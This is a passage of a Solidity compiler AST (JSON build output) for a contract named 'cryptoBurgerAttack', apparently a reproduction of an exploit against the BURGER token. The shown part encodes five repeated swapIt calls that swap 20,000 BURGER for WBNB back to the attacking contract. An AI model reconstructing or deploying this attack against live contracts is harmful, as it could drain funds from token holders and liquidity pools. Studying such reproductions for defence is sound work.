                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1108,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "10373:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1109,
                  "nodeType": "ExpressionStatement",
                  "src": "10373:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1111,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "10451:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1112,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "10459:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1115,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1113,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10465:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1114,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10473:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "10465:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1116,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "10479:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1121,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "10498:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1120,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "10490:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1119,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "10490:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1122,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "10490:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1118,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "10482:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1117,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "10482:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1123,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "10482:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1110,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "10444:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1124,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "10444:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1125,
                  "nodeType": "ExpressionStatement",
                  "src": "10444:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1127,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "10522:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1128,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "10530:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1131,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1129,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10536:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1130,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10544:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "10536:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1132,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "10550:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1137,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "10569:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1136,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "10561:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1135,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "10561:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1138,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "10561:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1134,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "10553:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1133,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "10553:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1139,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "10553:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1126,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "10515:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1140,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "10515:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1141,
                  "nodeType": "ExpressionStatement",
                  "src": "10515:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1143,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "10593:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1144,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "10601:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1147,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1145,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10607:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1146,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10615:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "10607:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1148,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "10621:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1153,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "10640:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1152,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "10632:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1151,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "10632:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1154,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "10632:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1150,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "10624:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1149,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "10624:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1155,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "10624:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1142,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "10586:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1156,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "10586:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1157,
                  "nodeType": "ExpressionStatement",
                  "src": "10586:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1159,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "10664:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1160,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "10672:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1163,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1161,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10678:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1162,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10686:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "10678:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1164,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "10692:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1169,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "10711:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1168,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "10703:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1167,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "10703:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1170,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "10703:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1166,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "10695:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1165,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "10695:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1171,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "10695:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1158,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "10657:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1172,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "10657:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1173,
                  "nodeType": "ExpressionStatement",
                  "src": "10657:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1175,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "10735:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1176,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "10743:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1179,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1177,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10749:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1178,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10757:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "10749:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1180,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "10763:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1185,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "10782:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1184,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "10774:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1183,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "10774:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1186,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "10774:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1182,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "10766:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1181,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "10766:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1187,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "10766:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1174,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "10728:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1188,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "10728:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
